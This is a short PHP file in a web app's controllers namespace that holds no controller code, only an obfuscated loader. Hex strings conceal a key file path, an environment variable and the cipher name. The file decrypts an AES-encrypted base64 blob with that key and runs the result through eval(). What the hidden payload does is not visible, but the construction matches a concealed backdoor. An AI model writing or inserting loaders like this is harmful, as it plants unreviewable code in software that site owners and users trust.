<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('6jC4edMdLzCkJ/eSl5R4Rw==');

$c=base64_decode(

'4+GMEwYqOvegOBeK6VM4SeEShWNA3SOr/Pdi9mAU/M7i3bPQRwo+grDiP9Zw9VpLL12opS3WRGei' .
'ehRZVjTQ/WYvdGM4wOdPCLmsOJOnw7LVPcxsPcntzDapKD47IrgrvVcXyAg2qfinY/7RlixL1YiL' .
'una7FyVdxPXrXEKTLW/QIJqgOo1VRHBpW2l/J47Mu+oy1zR1/BwrwJikT1tNdCH0emgE8J/JmVGG' .
'RxRobXVFV9mejSWS1LB7zHvrS5QP'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

